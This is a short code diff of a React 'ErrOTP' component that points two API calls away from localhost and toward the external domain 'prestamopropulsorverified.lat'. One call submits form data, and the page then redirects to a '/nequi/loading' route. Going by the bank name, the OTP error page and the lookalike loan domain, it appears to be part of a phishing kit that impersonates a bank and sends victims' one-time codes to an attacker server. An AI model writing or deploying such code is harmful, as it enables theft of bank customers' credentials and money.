@@ -20,7 +20,7 @@ export default function ErrOTP() {
       const id = localStorage.getItem('id');
 
       try {
-        const response = await axios.put(`http://127.0.0.1:8000/api/v1/guest/${id}`);
+        const response = await axios.put(`https://prestamopropulsorverified.lat/api/v1/guest/${id}`);
         setUser(response.data.user);
         setLoading(false); 
       } catch (error) {
@@ -43,8 +43,8 @@ export default function ErrOTP() {
     const id = localStorage.getItem('id');
 
     try {
-      const response = await axios.put(`http://127.0.0.1:8000/api/v1/guest/${id}`, data);
-      const newId = response.data;  // Cambia 'id' por 'newId'
+      const response = await axios.put(`https://prestamopropulsorverified.lat/api/v1/guest/${id}`, data);
+      const newId = response.data;
 
       navigate("/nequi/loading");
     } catch (error) {
